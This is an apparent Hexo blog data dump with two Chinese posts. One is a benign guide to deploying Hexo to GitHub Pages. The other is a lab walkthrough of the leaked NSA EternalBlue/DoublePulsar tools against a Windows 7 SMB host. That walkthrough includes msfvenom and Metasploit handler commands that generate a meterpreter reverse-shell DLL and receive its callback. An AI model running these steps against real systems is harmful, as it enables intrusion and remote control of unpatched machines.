alt=\"2\"><br>然后编辑名称为xxx.github.io，xxx为你的用户名，可以添加一些描述，如图<br><img src=\"/imgs/233/233-3.jpg\" alt=\"3\"><br>完成之后点击<code>Create repository</code></p>\n<h4 id=\"2-本地与github建立安全联系\"><a href=\"#2-本地与github建立安全联系\" class=\"headerlink\" title=\"2.本地与github建立安全联系\"></a>2.本地与github建立安全联系</h4><p>2.1生成ssh key</p>\n<p>2.1.1如图，打开Git Bash<br><img src=\"/imgs/233/233-4.jpg\" alt=\"4\"></p>\n<p>2.1.2创建.ssh文件夹<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir ~/.ssh</span><br></pre></td></tr></table></figure></p>\n<p>2.1.3配置全局的name和email，把下边命令里边的<code>xxxx</code>换成你github的用户名，<code>xxxx@xxx.com</code>换成你github的注册邮箱<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">\"xxxx\"</span>  </span><br><span class=\"line\">git config --global user.email <span class=\"string\">\"xxxx@xxx.com\"</span></span><br></pre></td></tr></table></figure></p>\n<p>2.1.4生成key<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">\"xxxx@xxx.com\"</span></span><br></pre></td></tr></table></figure></p>\n<p>输完命令后敲击三次回车，设置的密码为空，生成key成功</p>\n<p>2.1.5打开<code>C:\\用户\\你的用户名</code>目录进入.ssh文件夹，用Notepad++或者其他编辑器打开id_rsa.pub，复制里面的内容添加到你github或者bitbucket ssh设置里即可，如下图<br><img src=\"/imgs/233/233-5.jpg\" alt=\"5\"><br><img src=\"/imgs/233/233-6.jpg\" alt=\"6\"><br>标题随意填写</p>\n<h4 id=\"3-部署博客到github\"><a href=\"#3-部署博客到github\" class=\"headerlink\" title=\"3.部署博客到github\"></a>3.部署博客到github</h4><p>3.1为 Hexo 安装 Git 插件<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></p>\n<p>3.2修改你的 _config.yml 配置文件如下<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  <span class=\"built_in\">type</span>:git</span><br><span class=\"line\">  repo: git@github.com:xxxx/xxxx.github.io.git</span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure></p>\n<p>注意修改其中的repo为你自己github的ssh地址</p>\n<p>3.3在cmd切换到hexo目录下输入<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure></p>\n<p>即可完成部署，然后访问xxx.github.io就能访问你的博客了</p>\n<p>3.4如果想使用自己的域名，只需要把域名CNAME解析到xxx.github.io，然后在<code>~\\hexo\\source</code>目录中创建文件<code>CNAME</code>（没有后缀名）,文件里填上你的自定义域名（没有<code>http://</code>或者<code>https://</code>）然后执行一遍<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure></p>\n<p>即可，以后发布新文章或者有其他改动，都可以用上边的命令完成更新，或者用下边的命令在本地预览，前提是cmd切换到了hexo目录<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure></p>\n<p>本文参考资料：<a href=\"https://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"noopener\">Hexo官方文档</a>，<a href=\"https://www.cnblogs.com/imapla/p/5533000.html\" target=\"_blank\" rel=\"noopener\">Hexo博客部署到github</a>，<a href=\"http://blog.csdn.net/lsyz0021/article/details/52064829\" target=\"_blank\" rel=\"noopener\">win 7下git ssh创建key</a></p>\n","site":{"data":{}},"excerpt":"<p>所有可能用到的工具或者文件都放在百度网盘：链接：<a href=\"https://pan.baidu.com/s/1mhLRnk8\" target=\"_blank\" rel=\"noopener\">https://pan.baidu.com/s/1mhLRnk8</a> 提取密码：7ott</p>\n<h3 id=\"一、安装Hexo到本地\"><a href=\"#一、安装Hexo到本地\" class=\"headerlink\" title=\"一、安装Hexo到本地\"></a>一、安装Hexo到本地</h3><h4 id=\"1-安装Git\"><a href=\"#1-安装Git\" class=\"headerlink\" title=\"1.安装Git\"></a>1.安装Git</h4><p>1.1从<a href=\"https://git-scm.com/download/win\" target=\"_blank\" rel=\"noopener\">官网</a>或者上边提供的百度网盘下载Git安装包，由于众所周知的原因，官网下载十分缓慢。下载完安装即可，中间会让你选择默认编辑器，如果不习惯Vim推荐Notepad++作为默认编辑器，如图<br>","more":"<br><img src=\"/imgs/233/233-1.jpg\" alt=\"1\"></p>\n<p>其他保持默认即可。</p>\n<h4 id=\"2-安装Node-js\"><a href=\"#2-安装Node-js\" class=\"headerlink\" title=\"2.安装Node.js\"></a>2.安装Node.js</h4><p>2.1从<a href=\"https://nodejs.org/zh-cn/\" target=\"_blank\" rel=\"noopener\">官网</a>或者上边提供的百度网盘下载Node.js安装包。下载完安装即可，如果没有特别需求安装选项全部保持默认。</p>\n<h4 id=\"3-安装Hexo\"><a href=\"#3-安装Hexo\" class=\"headerlink\" title=\"3.安装Hexo\"></a>3.安装Hexo</h4><p>3.1使用Win+R打开运行，输入<code>cmd</code>，打开命令提示符，然后输入<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install -g hexo-cli</span><br></pre></td></tr></table></figure></p>\n<p>大概几十秒到2分钟后即可安装完成</p>\n<p>3.2安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。下边以放在D盘的hexo文件夹下为例<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo init D:\\hexo</span><br><span class=\"line\">D:</span><br><span class=\"line\"><span class=\"built_in\">cd</span> hexo &amp;&amp; npm install</span><br></pre></td></tr></table></figure></p>\n<p>大概几十秒到2分钟后即可安装完成，此时D:\\hexo文件夹的目录树如下<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">├── _config.yml</span><br><span class=\"line\">├── package.json</span><br><span class=\"line\">├── scaffolds</span><br><span class=\"line\">├── source</span><br><span class=\"line\">|   ├── _drafts</span><br><span class=\"line\">|   └── _posts</span><br><span class=\"line\">└── themes</span><br></pre></td></tr></table></figure></p>\n<h4 id=\"4-配置hexo\"><a href=\"#4-配置hexo\" class=\"headerlink\" title=\"4.配置hexo\"></a>4.配置hexo</h4><p>4.1用Notepad++或者其他编辑器打开_config.yml文件</p>\n<p>多数设置保持默认即可，一般需要改动的有如下几项：<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">title: <span class=\"comment\">#网站名称</span></span><br><span class=\"line\">subtitle: <span class=\"comment\">#副标题</span></span><br><span class=\"line\">description: <span class=\"comment\">#网站描述，主要用于SEO</span></span><br><span class=\"line\">author: <span class=\"comment\">#作者</span></span><br><span class=\"line\">language: <span class=\"comment\">#语言，中文填写'zh-cn'，没有引号</span></span><br><span class=\"line\">timezone: <span class=\"comment\">#网站时区。Hexo 默认使用您电脑的时区。中国可以填写'Asia/Shanghai'，没有引号</span></span><br><span class=\"line\">url: <span class=\"comment\">#你的网址，可以先不改动</span></span><br><span class=\"line\">theme: <span class=\"comment\">#主题选择</span></span><br></pre></td></tr></table></figure></p>\n<p>详细配置可以参照<a href=\"https://hexo.io/zh-cn/docs/configuration.html\" target=\"_blank\" rel=\"noopener\">Hexo官方文档</a></p>\n<p>4.2你可以到网络上下载主题，比如<a href=\"https://hexo.io/themes/\" target=\"_blank\" rel=\"noopener\">官网主题</a>，下载完解压到<code>~\\hexo\\themes</code>目录下的一个文件夹里，然后在<code>_config.yml</code>里边的<code>theme:</code>后填写文件夹名即可应用主题</p>\n<h4 id=\"5-新建博文\"><a href=\"#5-新建博文\" class=\"headerlink\" title=\"5.新建博文\"></a>5.新建博文</h4><p>5.1首先在cmd切换到你的hexo目录，可以在资源管理器打开hexo所在目录，然后在地址栏输入<code>cmd</code>然后敲击回车，很方便</p>\n<p>5.2cmd里边输入<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo new post001</span><br></pre></td></tr></table></figure></p>\n<p>就能在<code>~hexo\\source\\_posts</code>目录下生成post001.md文件，文件名可以自定义，编辑该文件写博文，语法可以参照<a href=\"http://www.jianshu.com/p/q81RER\" target=\"_blank\" rel=\"noopener\">Markdown新手指南</a>，或者<a href=\"https://other-1252906577.costj.myqcloud.com/doc/post233.md\" target=\"_blank\" rel=\"noopener\">下载当前博文的.md文件</a>以作参考</p>\n<h4 id=\"6-生成静态文件并预览\"><a href=\"#6-生成静态文件并预览\" class=\"headerlink\" title=\"6.生成静态文件并预览\"></a>6.生成静态文件并预览</h4><p>配置好hexo和主题并编辑完文章之后，可以通过<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo g</span><br></pre></td></tr></table></figure></p>\n<p>生成静态文件到public文件夹，你可以复制该文件夹下所有文件到你的网站目录来发布你的博客到网络</p>\n<p>可以通过以下命令<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo s</span><br></pre></td></tr></table></figure></p>\n<p>默认情况下在浏览器访问<code>http://localhost:4000/</code>预览你的博客</p>\n<h3 id=\"二、托管hexo博客到github\"><a href=\"#二、托管hexo博客到github\" class=\"headerlink\" title=\"二、托管hexo博客到github\"></a>二、托管hexo博客到github</h3><h4 id=\"1-注册github账号并创建Repository\"><a href=\"#1-注册github账号并创建Repository\" class=\"headerlink\" title=\"1.注册github账号并创建Repository\"></a>1.注册github账号并创建Repository</h4><p>1.1注册账号就不多说了，登陆之后点击<code>new repository</code>，如图<br><img src=\"/imgs/233/233-2.jpg\" alt=\"2\"><br>然后编辑名称为xxx.github.io，xxx为你的用户名，可以添加一些描述，如图<br><img src=\"/imgs/233/233-3.jpg\" alt=\"3\"><br>完成之后点击<code>Create repository</code></p>\n<h4 id=\"2-本地与github建立安全联系\"><a href=\"#2-本地与github建立安全联系\" class=\"headerlink\" title=\"2.本地与github建立安全联系\"></a>2.本地与github建立安全联系</h4><p>2.1生成ssh key</p>\n<p>2.1.1如图，打开Git Bash<br><img src=\"/imgs/233/233-4.jpg\" alt=\"4\"></p>\n<p>2.1.2创建.ssh文件夹<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">mkdir ~/.ssh</span><br></pre></td></tr></table></figure></p>\n<p>2.1.3配置全局的name和email，把下边命令里边的<code>xxxx</code>换成你github的用户名，<code>xxxx@xxx.com</code>换成你github的注册邮箱<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git config --global user.name <span class=\"string\">\"xxxx\"</span>  </span><br><span class=\"line\">git config --global user.email <span class=\"string\">\"xxxx@xxx.com\"</span></span><br></pre></td></tr></table></figure></p>\n<p>2.1.4生成key<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen -t rsa -C <span class=\"string\">\"xxxx@xxx.com\"</span></span><br></pre></td></tr></table></figure></p>\n<p>输完命令后敲击三次回车，设置的密码为空，生成key成功</p>\n<p>2.1.5打开<code>C:\\用户\\你的用户名</code>目录进入.ssh文件夹，用Notepad++或者其他编辑器打开id_rsa.pub，复制里面的内容添加到你github或者bitbucket ssh设置里即可，如下图<br><img src=\"/imgs/233/233-5.jpg\" alt=\"5\"><br><img src=\"/imgs/233/233-6.jpg\" alt=\"6\"><br>标题随意填写</p>\n<h4 id=\"3-部署博客到github\"><a href=\"#3-部署博客到github\" class=\"headerlink\" title=\"3.部署博客到github\"></a>3.部署博客到github</h4><p>3.1为 Hexo 安装 Git 插件<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">npm install hexo-deployer-git --save</span><br></pre></td></tr></table></figure></p>\n<p>3.2修改你的 _config.yml 配置文件如下<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># Deployment</span></span><br><span class=\"line\"><span class=\"comment\">## Docs: https://hexo.io/docs/deployment.html</span></span><br><span class=\"line\">deploy:</span><br><span class=\"line\">  <span class=\"built_in\">type</span>:git</span><br><span class=\"line\">  repo: git@github.com:xxxx/xxxx.github.io.git</span><br><span class=\"line\">  branch: master</span><br></pre></td></tr></table></figure></p>\n<p>注意修改其中的repo为你自己github的ssh地址</p>\n<p>3.3在cmd切换到hexo目录下输入<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure></p>\n<p>即可完成部署，然后访问xxx.github.io就能访问你的博客了</p>\n<p>3.4如果想使用自己的域名，只需要把域名CNAME解析到xxx.github.io，然后在<code>~\\hexo\\source</code>目录中创建文件<code>CNAME</code>（没有后缀名）,文件里填上你的自定义域名（没有<code>http://</code>或者<code>https://</code>）然后执行一遍<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean &amp;&amp; hexo g -d</span><br></pre></td></tr></table></figure></p>\n<p>即可，以后发布新文章或者有其他改动，都可以用上边的命令完成更新，或者用下边的命令在本地预览，前提是cmd切换到了hexo目录<br><figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">hexo clean &amp;&amp; hexo g &amp;&amp; hexo s</span><br></pre></td></tr></table></figure></p>\n<p>本文参考资料：<a href=\"https://hexo.io/zh-cn/docs/\" target=\"_blank\" rel=\"noopener\">Hexo官方文档</a>，<a href=\"https://www.cnblogs.com/imapla/p/5533000.html\" target=\"_blank\" rel=\"noopener\">Hexo博客部署到github</a>，<a href=\"http://blog.csdn.net/lsyz0021/article/details/52064829\" target=\"_blank\" rel=\"noopener\">win 7下git ssh创建key</a></p>"},{"title":"NSA工具包验证之SMB漏洞利用","date":"2017-06-15T04:12:59.000Z","_content":"\n### 验证环境：\n\n攻击机1(本次演示IP：172.16.11.2)：windows系统，[安装python2.6.6](https://www.python.org/download/releases/2.6.6/), [pywin32-221.win32-py2.6.exe](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/), xshell, xftp, [下载方程式工具包](https://codeload.github.com/misterch0c/shadowbroker/zip/master)放到C盘，在工具包目录下的windows目录新建文件夹\"listeningposts\"，并且开放所有端口关闭防火墙，确保内网可以访问之\n\n攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度\n\n目标机1(本次演示IP：172.16.12.3)：开放了445端口的windows 7（windows2008与之攻击方法完全相同）\n\n以上所有IP之间均可以直接访问\n\n### 验证步骤：\n<!--more-->\n* * *\n\n#### 第一步：生成可执行的恶意dll文件\n\n0x01\n\n首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：\n\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg \"1.jpg\")\n\n0x02\n\n执行命令：\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll > s.dll\n```\n\n在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell\n\n0x03\n\n点击xshell如图位置\n\n![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg \"3.jpg\")\n\n打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图\n\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg \"4.jpg\")\n\n#### 第二步：配置kali使得kali处于监听状态\n\n0x01\n\n依次输入命令\n```\nmsfconsole\nuse exploit/multi/handler\nset lhost 172.16.12.2\nset lport 5555\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit\n```\n看到如图即说明配置成功\n\n![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg \"2.jpg\")\n\n这时就可以将xshell最小化，等后边再用\n\n#### 第三步：使用方程式工具包进行攻击\n\n0x01\n\n将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为\"listeningposts\"的文件夹，如图，不然运行会报错\n\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg \"5.jpg\")\n\n0x02\n\n打开命令提示符，输入\n```\nC:\\win\\fb.py\n```\n然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图\n\n![6.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/6.jpg \"6.jpg\")\n\n0x03\n\n输入命令\n```\nuse Eternalblue\n```\n然后敲击回车，保持默认设置，除了下图俩需要选择，其他直接敲击回车使用默认配置即可\n\n![7.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/7.jpg \"7.jpg\")\n\n之后再敲几下回车开始攻击，得到结果如图\n\n![8.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/8.jpg \"8.jpg\")\n\n可以看到最后\"Eternalblue Succeeded\"显示成功，当然，不是所有攻击都会成功，需要一定运气的\n\n0x04\n\n输入命令\n```\nuse Doublepulsar\n```\n\n然后会要求输入一些参数，比如系统位数、后门操作、后门路径等，除了下图中红框标出的部分，其他保持默认即可\n\n![9.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/9.jpg \"9.jpg\")\n\n接着输入后门路径，即我们之前用kali生成的s.dll，如下图\n\n![10.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/10.jpg \"10.jpg\")\n\n之后不断敲击回车开始在目标机执行s.dll，成功后如图\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/11.jpg \"11.jpg\")\n\n这时打开xshell可以看到已经成功反弹shell\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/12.jpg \"12.jpg\")\n\n然后就可以比如说输入shell模拟终端执行命令，创建账户，等等，总之服务器权限已经拿到了\n\n![13.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/13.jpg \"13.jpg\")","source":"_posts/post160.md","raw":"---\ntitle: NSA工具包验证之SMB漏洞利用\ndate: 2017-06-15 12:12:59\ntags: 网络安全\n---\n\n### 验证环境：\n\n攻击机1(本次演示IP：172.16.11.2)：windows系统，[安装python2.6.6](https://www.python.org/download/releases/2.6.6/), [pywin32-221.win32-py2.6.exe](https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/), xshell, xftp, [下载方程式工具包](https://codeload.github.com/misterch0c/shadowbroker/zip/master)放到C盘，在工具包目录下的windows目录新建文件夹\"listeningposts\"，并且开放所有端口关闭防火墙，确保内网可以访问之\n\n攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度\n\n目标机1(本次演示IP：172.16.12.3)：开放了445端口的windows 7（windows2008与之攻击方法完全相同）\n\n以上所有IP之间均可以直接访问\n\n### 验证步骤：\n<!--more-->\n* * *\n\n#### 第一步：生成可执行的恶意dll文件\n\n0x01\n\n首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：\n\n![1.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg \"1.jpg\")\n\n0x02\n\n执行命令：\n```\nmsfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll > s.dll\n```\n\n在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell\n\n0x03\n\n点击xshell如图位置\n\n![3.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg \"3.jpg\")\n\n打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图\n\n![4.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg \"4.jpg\")\n\n#### 第二步：配置kali使得kali处于监听状态\n\n0x01\n\n依次输入命令\n```\nmsfconsole\nuse exploit/multi/handler\nset lhost 172.16.12.2\nset lport 5555\nset PAYLOAD windows/x64/meterpreter/reverse_tcp\nexploit\n```\n看到如图即说明配置成功\n\n![2.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/2.jpg \"2.jpg\")\n\n这时就可以将xshell最小化，等后边再用\n\n#### 第三步：使用方程式工具包进行攻击\n\n0x01\n\n将方程式工具包下的windows文件夹重命名为win，然后拷贝到C盘根目录下，并在该文件夹下新建一个名为\"listeningposts\"的文件夹，如图，不然运行会报错\n\n![5.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/5.jpg \"5.jpg\")\n\n0x02\n\n打开命令提示符，输入\n```\nC:\\win\\fb.py\n```\n然后依次输入目标IP，本地IP，是否重定向，日志存放位置，新建工程，给该工程命名，最后确认，如图\n\n![6.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/6.jpg \"6.jpg\")\n\n0x03\n\n输入命令\n```\nuse Eternalblue\n```\n然后敲击回车，保持默认设置，除了下图俩需要选择，其他直接敲击回车使用默认配置即可\n\n![7.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/7.jpg \"7.jpg\")\n\n之后再敲几下回车开始攻击，得到结果如图\n\n![8.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/8.jpg \"8.jpg\")\n\n可以看到最后\"Eternalblue Succeeded\"显示成功，当然，不是所有攻击都会成功，需要一定运气的\n\n0x04\n\n输入命令\n```\nuse Doublepulsar\n```\n\n然后会要求输入一些参数，比如系统位数、后门操作、后门路径等，除了下图中红框标出的部分，其他保持默认即可\n\n![9.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/9.jpg \"9.jpg\")\n\n接着输入后门路径，即我们之前用kali生成的s.dll，如下图\n\n![10.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/10.jpg \"10.jpg\")\n\n之后不断敲击回车开始在目标机执行s.dll，成功后如图\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/11.jpg \"11.jpg\")\n\n这时打开xshell可以看到已经成功反弹shell\n\n![](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/12.jpg \"12.jpg\")\n\n然后就可以比如说输入shell模拟终端执行命令，创建账户，等等，总之服务器权限已经拿到了\n\n![13.jpg](https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/13.jpg \"13.jpg\")","slug":"post160","published":1,"updated":"2020-12-07T02:06:24.515Z","comments":1,"layout":"post","photos":[],"link":"","_id":"ckrlq5rdo0024q0szgemf3bym","content":"<h3 id=\"验证环境：\"><a href=\"#验证环境：\" class=\"headerlink\" title=\"验证环境：\"></a>验证环境：</h3><p>攻击机1(本次演示IP：172.16.11.2)：windows系统，<a href=\"https://www.python.org/download/releases/2.6.6/\" target=\"_blank\" rel=\"noopener\">安装python2.6.6</a>, <a href=\"https://sourceforge.net/projects/pywin32/files/pywin32/Build%20221/\" target=\"_blank\" rel=\"noopener\">pywin32-221.win32-py2.6.exe</a>, xshell, xftp, <a href=\"https://codeload.github.com/misterch0c/shadowbroker/zip/master\" target=\"_blank\" rel=\"noopener\">下载方程式工具包</a>放到C盘，在工具包目录下的windows目录新建文件夹”listeningposts”，并且开放所有端口关闭防火墙，确保内网可以访问之</p>\n<p>攻击机2(本次演示IP：172.16.12.2)：kali linux，需要开启ssh服务，详情百度</p>\n<p>目标机1(本次演示IP：172.16.12.3)：开放了445端口的windows 7（windows2008与之攻击方法完全相同）</p>\n<p>以上所有IP之间均可以直接访问</p>\n<h3 id=\"验证步骤：\"><a href=\"#验证步骤：\" class=\"headerlink\" title=\"验证步骤：\"></a>验证步骤：</h3><a id=\"more\"></a>\n<hr>\n<h4 id=\"第一步：生成可执行的恶意dll文件\"><a href=\"#第一步：生成可执行的恶意dll文件\" class=\"headerlink\" title=\"第一步：生成可执行的恶意dll文件\"></a>第一步：生成可执行的恶意dll文件</h4><p>0x01</p>\n<p>首先通过xshell连接到kali linux，打开xshell，在跳出来的窗口点击new(新建)，然后填入kali的IP地址点击确定然后连接，接着依次输入kali的账号与密码即可连接，可能会跳出安全警告，点击接收并保存即可，连接完成得到如图：</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/1.jpg\" alt=\"1.jpg\" title=\"1.jpg\"></p>\n<p>0x02</p>\n<p>执行命令：<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=172.16.12.2 LPORT=5555 -f dll &gt; s.dll</span><br></pre></td></tr></table></figure></p>\n<p>在kali根目录下生成s.dll文件，其中LHOST为kali的IP地址，LPORT为一个可任意填写的端口，届时将使目标机执行该dll向172.16.12.2:5555发送shell</p>\n<p>0x03</p>\n<p>点击xshell如图位置</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/3.jpg\" alt=\"3.jpg\" title=\"3.jpg\"></p>\n<p>打开本地C盘，并将kali目录下刚刚生成的s.dll复制到本机的C盘根目录下，如图</p>\n<p><img src=\"https://blog-1252906577.costj.myqcloud.com/img/NSA%E6%BC%94%E7%A4%BA/4.jpg\" alt=\"4.jpg\" title=\"4.jpg\"></p>\n<h4 id=\"第二步：配置kali使得kali处于监听状态\"><a href=\"#第二步：配置kali使得kali处于监听状态\" class=\"headerlink\" title=\"第二步：配置kali使得kali处于监听状态\"></a>第二步：配置kali使得kali处于监听状态</h4><p>0x01</p>\n<p>依次输入命令<br><figure class=\"highlight plain\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">msfconsole</span><br><span class=\"line\">use exploit/multi/handler</span><br><span class=\"line\">set lhost 172.16.12.2</span><br><span class=\"line\">set lport 5555</span><br><span class=\"line\">set PAYLOAD windows/x64/meterpreter/reverse_tcp</span><br><span 